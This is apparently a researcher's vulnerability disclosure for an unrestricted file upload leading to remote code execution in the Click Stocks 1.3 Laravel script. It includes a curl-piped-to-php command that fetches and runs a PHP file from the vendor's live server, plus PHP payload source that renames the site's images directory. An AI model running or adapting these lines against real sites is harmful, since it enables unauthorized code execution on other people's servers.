## [Click Stocks-1.3 - File Upload - RCE](https://codecanyon.net/item/click-stocks-free-stock-photos-laravel-script/23356416)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/media-city/Click-Stocks-1.3/docs/Screenshot%202023-11-19%20141205.png)

## WARNING! 
- This is a little brutal attack, but not for destroying purposes! 
- The vendor must be stopping this product from selling, immediately!

## Description:
The class parameter btn-btn-danger-js-labelFile is vulnerable to File Upload and RCE attacks, it is not sanitized correctly.
The attacker can upload a virus directly on the server by using this web vulnerability, and then he can execute it, this can be 
the end of this server depending on the scenario! In this case, I just renamed the directory images =) 
I am a Penetration Tester, not a stupid cracker! Thank you all!

STATUS: HIGH-CRITICAL Vulnerability

[+]Exploit execution:

```curl
 curl -s https://mediacity.co.in/clickstocks/public/images/rapist.php | php
```

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/media-city/Click-Stocks-1.3/docs/Screenshot%202023-11-20%20231609.png)

[+]Exploit source:
```PHP
<?php 
// rapist by nu11secur1ty - 2023
// Old Name Of The file
	$old_name = "/public/images" ; 
  
// New Name For The File
	$new_name = "/public/imagesHACKED/" ; 
  
// using rename() function to rename the file
	rename( $old_name, $new_name) ;
  
?>

```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/media-city/Click-Stocks-1.3)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/11/click-stocks-13-file-upload-rce.html)

## Time spent:
00:35:00
